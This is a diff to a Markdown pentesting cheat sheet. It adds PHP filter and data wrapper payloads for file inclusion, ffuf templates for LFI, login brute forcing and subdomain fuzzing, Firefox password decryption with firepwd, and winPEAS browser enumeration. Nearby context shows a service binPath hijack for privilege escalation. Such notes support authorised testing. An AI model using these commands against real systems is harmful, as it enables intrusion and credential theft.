@@ -54,20 +54,26 @@ cadaver 'URL'
 ```sh
 curl -I 'URL'
 curl -X OPTIONS -I 'URL'
-curl -ks 'URL'
 curl --path-as-is 'URL'
+# php wrapper
+php://filter/convert.base64-encode/resource='FILENAME'
+data://text/plain;base64,'BASE64'
 ```
 - davtest ![GitHub Repo stars](https://img.shields.io/github/stars/cldrn/davtest?style=social)
 - ffuf ![GitHub Repo stars](https://img.shields.io/github/stars/ffuf/ffuf?style=social)
 ```sh
-ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://'URL'/FUZZ
-ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http//'URL'/FUZZ/
-ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://'URL'/FUZZ
-ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://'URL'/FUZZ -e .sh
-# subdomain
-ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.DOMAIN' -u http://'URL' -fs 'RESPONSE_SIZE'
+ffuf -u http://'URL'/FUZZ -c -e .sh -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+ffuf -u http://'URL'/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
+ffuf -u http://'URL'/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ffuf -u http://'URL'/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 # lfi
-ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u http://'URL'=FUZZ -fs 'RESPONSE_SIZE'
+ffuf -u http://'URL'=FUZZ -c -fs 'SIZE' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
+# login brute force
+ffuf -request 'FILENAME' -w 'USERLIST':userFUZZ -w 'PASSLIST':passFUZZ -fr 'WORDS'
+# parameter
+ffuf -u http://'URL'?FUZZ= -c -fs 'SIZE' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+# subdomain
+ffuf -H 'Host: FUZZ.DOMAIN' -u http://'URL' -c -fs 'SIZE' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 ```
 - nmap
 ```sh
@@ -207,6 +213,10 @@ netexec ldap 'IP' --dns-server 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodho
 # heartbleed
 nmap -n -Pn -p443 --script=ssl-heartbleed 'IP'
 ```
+- openssl
+```sh
+openssl s_client -connect 'IP':'PORT' | openssl x509 -nocert -ext subjectAltName
+```
 - sslscan ![GitHub Repo stars](https://img.shields.io/github/stars/rbsec/sslscan?style=social)
 - CVE
   - [heartbleed](https://github.com/sensepost/heartbleed-poc)
@@ -340,6 +350,10 @@ smbmap -H 'IP' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursiv
 
 ## 1433
 - impacket-mssqlclient
+- sqlcmd
+```powershell
+sqlcmd -d 'DATABASE' -P 'PASSWORD' -U 'USERNAME' -Q 'SQL'
+```
 
 
 ## 5060 (UDP)
@@ -383,6 +397,10 @@ chisel client --max-retry-count 'NUM' 'IP_SERVER':'PORT_SERVER' R:'PORT':socks
 - exiftool
 ```sh
 exiftool 'FILENAME'
+```
+- firepwd
+```sh
+uv run firepwd.py -d 'DIRECTORY'
 ```
 - gpp-decrypt
 ```sh
@@ -556,9 +574,10 @@ sc.exe config 'SERVICENAME' binPath="C:\WIndows\system32\cmd.exe /c 'COMMAND'"
 - winpeas ![GitHub Repo stars](https://img.shields.io/github/stars/peass-ng/PEASS-ng?style=social)
 ```powershell
 # 32bit or 64bit のバージョンに注意
-.\winPEASx64.exe userinfo quiet
-.\winPEASx64.exe systeminfo quiet
+.\winPEASx64.exe browserinfo quiet
 .\winPEASx64.exe servicesinfo quiet
+.\winPEASx64.exe systeminfo quiet
+.\winPEASx64.exe userinfo quiet
 ```
 
 
@@ -596,6 +615,7 @@ sc.exe config 'SERVICENAME' binPath="C:\WIndows\system32\cmd.exe /c 'COMMAND'"
 - https://juggernaut-sec.com/
 - https://kashz.gitbook.io/kashz-jewels
 - https://morgan-bin-bash.gitbook.io/pentesting/
+- https://portswigger.net/web-security/all-topics
 - https://www.hackingarticles.in/
 - https://www.thehacker.recipes/
 - https://www.revshells.com/
